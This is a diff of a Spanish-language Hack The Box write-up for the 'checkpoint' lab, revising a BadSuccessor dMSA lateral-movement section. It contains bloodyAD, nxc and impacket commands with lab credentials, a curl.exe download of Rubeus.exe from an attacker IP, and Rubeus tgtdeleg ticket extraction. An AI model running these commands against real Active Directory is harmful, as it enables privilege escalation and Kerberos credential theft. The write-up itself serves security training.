@@ -1043,110 +1043,28 @@ En nuestro caso, tenemos ambos casos, tenemos a alex, el cual puede crear CREATE
 
 Flujo de escalada hacia una cuenta de servicio (lateral movement):
 
-- Alex crea una cuenta con dMSA mediante su permiso CREATE_CHILD en OU=Employees subcayente de `svc_deploy`
-- Ryan al tener permiso WRITE sobre svc_deploy escribe los atributos `msDS-Superseded*` necesarios para completar la sincronizacion mutua de ambos lados: Alex crea cuenta dMSA heredada de svc_deploy > ryan escribe atributos en svc_deploy para completar la sincronicacion y ejecutar badsuccessor con exito.
+- Ryan crea una cuenta con dMSA mediante su permiso CREATE_CHILD en OU=dMSAHolder subcayente de `svc_deploy`
+- Ryan al tener permiso WRITE sobre svc_deploy escribe los atributos `msDS-Superseded*` necesarios para completar la sincronizacion mutua de ambos lados: ryan crea cuenta dMSA heredada de svc_deploy > ryan escribe atributos en svc_deploy para completar la sincronicacion y ejecutar badsuccessor con exito.
+
+Segun el entorno, tanto Alex como ryan tenian permisos de CREATE_CHILD. Alex en la OU=Employees y Ryan en la OU=dMSAHolder. Ambas OUS tenian el permiso necesario para poder crear un CC (objeto hijo) con los atributos de msDS-DelegatedManagedServiceAccount
+ 
 
 ``` bash
 
-❯ bloodyAD --host dc01.checkpoint.htb --dc-ip 10.129.113.22 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' add badSuccessor svc_pwn -t 'CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb' --ou 'OU=Employees,DC=checkpoint,DC=htb' --prepatch
-[+] Creating DMSA svc_pwn$ in OU=Employees,DC=checkpoint,DC=htb
-[+] Impersonating: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
-[-] Failed to retrieve dMSA TGT
-[-] Try using Rubeus, or something like:
-[-] badS4U2self 'kerberos+pw://checkpoint.htb\alex.turner:Checkpoint2024%21@10.129.113.22/' 'krbtgt/checkpoint.htb@checkpoint.htb' 'svc_pwn$@checkpoint.htb' --dmsa
-Traceback (most recent call last):
-  File "/home/joel/.local/lib/python3.13/site-packages/kerbad/client.py", line 313, in get_TGT
-    preauth_rep = self.do_preauth(etype, with_pac=with_pac)
-  File "/home/joel/.local/lib/python3.13/site-packages/kerbad/client.py", line 189, in do_preauth
-    rep = self.ksoc.sendrecv(req.dump())
-  File "/home/joel/.local/lib/python3.13/site-packages/kerbad/network/clientsocket.py", line 85, in sendrecv
-    raise KerberosError(krb_message)
-kerbad.protocol.errors.KerberosError:  Error Name: KDC_ERR_ETYPE_NOTSUPP Detail: "KDC has no support for encryption type"
-
-During handling of the above exception, another exception occurred:
-
-Traceback (most recent call last):
-  File "/home/joel/.local/bin/bloodyAD", line 6, in <module>
-    sys.exit(main())
-             ~~~~^^
-  File "/home/joel/.local/lib/python3.13/site-packages/bloodyAD/main.py", line 342, in main
-    asyncio.run(amain())
-    ~~~~~~~~~~~^^^^^^^^^
-  File "/usr/lib/python3.13/asyncio/runners.py", line 195, in run
-    return runner.run(main)
-           ~~~~~~~~~~^^^^^^
-  File "/usr/lib/python3.13/asyncio/runners.py", line 118, in run
-    return self._loop.run_until_complete(task)
-           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^
-  File "/usr/lib/python3.13/asyncio/base_events.py", line 725, in run_until_complete
-    return future.result()
-           ~~~~~~~~~~~~~^^
-  File "/home/joel/.local/lib/python3.13/site-packages/bloodyAD/main.py", line 272, in amain
-    output = await result
-             ^^^^^^^^^^^^
-  File "/home/joel/.local/lib/python3.13/site-packages/bloodyAD/cli_modules/add.py", line 195, in badSuccessor
-    raise e
-  File "/home/joel/.local/lib/python3.13/site-packages/bloodyAD/cli_modules/add.py", line 186, in badSuccessor
-    tgs, encTGSRepPart, key = client.with_clock_skew(client.S4U2self, target_user, service_spn, is_dmsa=True)
-                              ~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/joel/.local/lib/python3.13/site-packages/kerbad/client.py", line 845, in with_clock_skew
-    return func(*args, **kwargs)
-  File "/home/joel/.local/lib/python3.13/site-packages/kerbad/client.py", line 556, in S4U2self
-    self.get_TGT()
-    ~~~~~~~~~~~~^^
-  File "/home/joel/.local/lib/python3.13/site-packages/kerbad/client.py", line 323, in get_TGT
-    preauth_rep = self.do_preauth(srv_etype, with_pac=with_pac)
-  File "/home/joel/.local/lib/python3.13/site-packages/kerbad/client.py", line 189, in do_preauth
-    rep = self.ksoc.sendrecv(req.dump())
-  File "/home/joel/.local/lib/python3.13/site-packages/kerbad/network/clientsocket.py", line 85, in sendrecv
-    raise KerberosError(krb_message)
-kerbad.protocol.errors.KerberosError:  Error Name: KDC_ERR_ETYPE_NOTSUPP Detail: "KDC has no support for encryption type"
-╭─ ~/hacking/ctf/htb/medium/checkpoint/scripts                                                               1 х ─╮
-╰─                                                                                                               ─╯
-
-```
-
-``` bash
-
-❯ nxc ldap 10.129.113.22 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --query '(sAMAccountName=svc_pwn$)' 'distinguishedName msDS-ManagedAccountPrecededByLink'
-LDAP        10.129.113.22   389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb) (signing:Enforced) (channel binding:No TLS cert)
-LDAP        10.129.113.22   389    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024!
-LDAP        10.129.113.22   389    DC01             [+] Response for object: CN=svc_pwn,OU=Employees,DC=checkpoint,DC=htb
-LDAP        10.129.113.22   389    DC01             distinguishedName    CN=svc_pwn,OU=Employees,DC=checkpoint,DC=htb
-LDAP        10.129.113.22   389    DC01             msDS-ManagedAccountPrecededByLink CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
-╭─ ~/hacking/ctf/htb/medium/checkpoint/scripts                                                           ✔ │ 14s ─╮
-╰─                                                                                                               ─╯
-
-```
-
-``` bash
-
-❯ sudo ntpdate 10.129.113.22
-
-2026-08-29 05:04:01.315246 (+0200) +25144.841347 +/- 0.020970 10.129.113.22 s1 no-leap
-CLOCK: time stepped by 25144.841347
-❯ impacket-getTGT checkpoint.htb/alex.turner:'Checkpoint2024!' -dc-ip 10.129.113.22
-Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
-
-[*] Saving ticket in alex.turner.ccache
-╭─ ~/hacking/ctf/htb/medium/checkpoint/scripts                                                            ✔ │ 4s ─╮
-╰─                                                                                                               ─╯
-
-```
-
-``` bash
-
-❯ export KRB5CCNAME=alex.turner.ccache
-
-❯ impacket-getST -dc-ip 10.129.113.22 -spn 'cifs/dc01.checkpoint.htb' 'checkpoint.htb/svc_pwn$' -k -no-pass -dmsa
-Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
-
-[*] Getting ST for user
-[*] Saving ticket in svc_pwn$@cifs_dc01.checkpoint.htb@CHECKPOINT.HTB.ccache
+❯ if bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get object 'OU=DMSAHolder,DC=checkpoint,DC=htb' --attr allowedChildClasses | grep -q "msDS-DelegatedManagedServiceAccount"; then echo "msDS-DelegatedManagedServiceAccount"; else echo "No vulnerable"; fi
+msDS-DelegatedManagedServiceAccount
+❯ if bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get object 'OU=Employees,DC=checkpoint,DC=htb' --attr allowedChildClasses | grep -q "msDS-DelegatedManagedServiceAccount"; then echo "msDS-DelegatedManagedServiceAccount"; else echo "No vulnerable"; fi
+msDS-DelegatedManagedServiceAccount
 ╭─ ~/hacking/ctf/htb/medium/checkpoint/scripts                                                                 ✔ ─╮
 ╰─                                                                                                               ─╯
 
 ```
+
+Sin embargo haciendo la prueba con alex no funcionaba. Tuve que pasar a hacer el proceso con el usuario Ryan.
+
+No disponia credenciales del usuario Ryan asi que me tuve que descargar el software Rubeux en mi maquina atackante y compartirlo a la shell donde estoy con el usuario Ryan para conseguir su ticket kerberos y asi pasarmelo a mi maquina atackante y poder autenticarme desde fuera con este usuario.
+
+
 
 ``` bash
 
@@ -1158,6 +1076,8 @@ curl.exe "http://10.10.15.179:8080/Rubeus.exe" -o "Rubeus.exe"
 PS C:\Users\ryan.brooks\Desktop>
 
 ```
+
+Extraemos el tgt (ticket) delegado actual del usuario:
 
 ``` bash
 
@@ -1190,6 +1110,9 @@ PS C:\Users\ryan.brooks\Desktop> .\Rubeus.exe tgtdeleg /nowrap
 PS C:\Users\ryan.brooks\Desktop>
 
 ```
+
+Lo guardamos en un archivo en nuestra maquina atackante, lo decodificamos y lo guardamos como ryan.kirbi para posteriormente `impacket-ticketConverter` lo convierta. Una vez hecho guardamos el archivo ryan.ccache en una variable de entorno para que las herramientas con la flag `-k` puedan leer y autenticarse con el ticket.
+
 
 ``` bash
 
